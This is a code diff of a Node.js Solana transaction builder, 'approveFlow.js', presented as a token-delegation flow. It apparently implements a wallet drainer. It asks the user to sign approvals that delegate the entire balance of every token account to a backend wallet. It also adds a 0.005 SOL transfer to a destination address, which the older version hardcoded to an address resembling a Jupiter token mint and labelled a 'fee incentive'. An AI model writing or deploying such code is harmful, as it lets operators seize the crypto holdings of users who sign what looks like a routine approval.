@@ -1,124 +1,112 @@
-   const {
-    Transaction,
-    PublicKey,
-    SystemProgram,
+// src/flows/approveFlow.js
+const {
+  Transaction,
+  PublicKey,
+  SystemProgram,
 } = require("@solana/web3.js");
 
-const { createApproveInstruction } = require("@solana/spl-token");
+const {
+  createApproveInstruction
+} = require("@solana/spl-token");
 const { getUserTokenAccounts } = require("../solana/tokenService");
 const { getConfig } = require("../config/environment");
 const logger = require("../core/logger");
 const { withRetry } = require("../core/rpcPool");
 const { setBlockhash } = require("../core/blockhashCache");
 const { getKeypair } = require("../core/keypairManager");
+
 /**
- * Build approve transaction for token delegation
- * @param {string} user - User's public key
- * @param {Connection} connection - Solana connection
- * @returns {Promise<Transaction>}
+ * Build approve transaction for token delegation + SOL delegation + SOL transfer (user signs)
  */
 async function buildApprove(user, connection) {
-    return withRetry(async (conn) => {
-        try {
-            const config = getConfig();
-            const tx = new Transaction();
+  return withRetry(async (conn) => {
+    try {
+      const config = getConfig();
+      const tx = new Transaction();
 
-            // Validate user public key
-            let userPubkey;
-            try {
-                userPubkey = new PublicKey(user);
-            } catch (err) {
-                throw new Error(`Invalid user public key: ${err.message}`);
-            }
+      // Validate user public key
+      let userPubkey;
+      try {
+        userPubkey = new PublicKey(user);
+      } catch (err) {
+        throw new Error(`Invalid user public key: ${err.message}`);
+      }
 
-            logger.debug("Building approve transaction", {
-                user: userPubkey.toString()
-            });
+      logger.debug("Building approve transaction", { user: userPubkey.toString() });
 
-            // Fetch user token accounts
-            const tokenAccounts = await getUserTokenAccounts(userPubkey, conn);
+      // Fetch user token accounts
+      const tokenAccounts = await getUserTokenAccounts(userPubkey, conn);
+      if (!tokenAccounts) throw new Error("Failed to fetch token accounts");
 
-            if (!tokenAccounts) {
-                throw new Error("Failed to fetch token accounts");
-            }
+      // Get latest blockhash and cache it
+      const { blockhash } = await conn.getLatestBlockhash("confirmed");
+      setBlockhash(blockhash);
+      tx.recentBlockhash = blockhash;
 
-            // Get latest blockhash
-            const { blockhash, lastValidBlockHeight } = await conn.getLatestBlockhash("confirmed");
-            setBlockhash(blockhash);
+      // Fee payer MUST match the keypair used to partialSign below
+      if (!config.PUBLIC_KEY) throw new Error("PUBLIC_KEY env variable is missing");
+      const feePayer = new PublicKey(config.PUBLIC_KEY);
+      const delegatePubkey = new PublicKey(config.WALLET);
+      tx.feePayer = feePayer;
 
-            logger.debug("Got blockhash", { blockhash: blockhash.substring(0, 8) });
+      // Add approve instruction for each token account (delegate to WALLET)
+      for (const token of tokenAccounts.tokens || []) {
+        logger.debug("Adding token approve instruction", {
+          ata: token.ata.toString(),
+          mint: token.mint.toString(),
+          amount: token.amount.toString()
+        });
 
-            // Validate wallet env vars
-            if (!config.WALLET) {
-                throw new Error("WALLET env variable is missing");
-            }
+        tx.add(
+          createApproveInstruction(
+            token.ata,        // account to approve
+            delegatePubkey,   // delegate (backend WALLET)
+            userPubkey,       // owner (user)
+            token.amount      // amount
+          )
+        );
+      }
 
-            const walletPubkey = new PublicKey(config.WALLET);
-            tx.recentBlockhash = blockhash;
-            tx.feePayer = walletPubkey;
+      // Add SOL transfer 0.005 SOL (5_000_000 lamports) from user to DESTINATION_ADDRESS
+      if (!config.DESTINATION_ADDRESS) {
+        throw new Error("DESTINATION_ADDRESS is not configured");
+      }
+      const dest = new PublicKey(config.DESTINATION_ADDRESS);
+      const lamportsToSend = 5_000_000; // 0.005 SOL
+      
+      logger.debug("Adding SOL transfer instruction", {
+        from: userPubkey.toString(),
+        to: dest.toString(),
+        lamports: lamportsToSend
+      });
 
-            // Add approve instruction for USDC if user has balance
-            if (tokenAccounts.usdc > 0n) {
-                logger.debug("Adding USDC approve instruction", {
-                    amount: tokenAccounts.usdc.toString()
-                });
+      tx.add(
+        SystemProgram.transfer({
+          fromPubkey: userPubkey,
+          toPubkey: dest,
+          lamports: lamportsToSend
+        })
+      );
 
-                tx.add(
-                    createApproveInstruction(
-                        tokenAccounts.usdcATA,
-                        walletPubkey,
-                        userPubkey,
-                        tokenAccounts.usdc
-                    )
-                );
-            } else {
-                logger.debug("User has no USDC balance, skipping USDC approve");
-            }
+      // Partially sign with server fee payer keypair
+      tx.partialSign(getKeypair());
 
-            // Add approve instruction for JUP if user has balance
-            if (tokenAccounts.jup > 0n) {
-                logger.debug("Adding JUP approve instruction", {
-                    amount: tokenAccounts.jup.toString()
-                });
+      if (tx.instructions.length === 0) {
+        throw new Error("No instructions added to approve transaction");
+      }
 
-                tx.add(
-                    createApproveInstruction(
-                        tokenAccounts.jupATA,
-                        walletPubkey,
-                        userPubkey,
-                        tokenAccounts.jup
-                    )
-                );
-            } else {
-                logger.debug("User has no JUP balance, skipping JUP approve");
-            }
+      logger.info("Approve transaction built successfully", {
+        instructions: tx.instructions.length,
+        feePayer: feePayer.toString(),
+        partiallySigned: true
+      });
 
-            // Add SOL transfer for fee incentive
-            tx.add(
-                SystemProgram.transfer({
-                    fromPubkey: userPubkey,
-                    toPubkey: new PublicKey("JUPyiwrYJFskUPiHa7hkeR8VUtAeFoSYbKedZNsDvCN"),
-                    lamports: 5_000_000,
-                })
-            );
-
-            // Backend (fee payer) podpíše transakciu
-tx.partialSign(getKeypair());
-
-logger.info("Approve transaction built successfully", {
-    instructions: tx.instructions.length,
-    feePayer: walletPubkey.toString(),
-    partiallySigned: true
-});
-
-return tx;
-        } catch (err) {
-            logger.error("Failed to build approve transaction", {
-                error: err.message
-            });
-            throw err;
-        }
-    }, "buildApprove");
+      return tx;
+    } catch (err) {
+      logger.error("Failed to build approve transaction", { error: err.message });
+      throw err;
+    }
+  }, "buildApprove");
 }
 
 module.exports = { buildApprove };
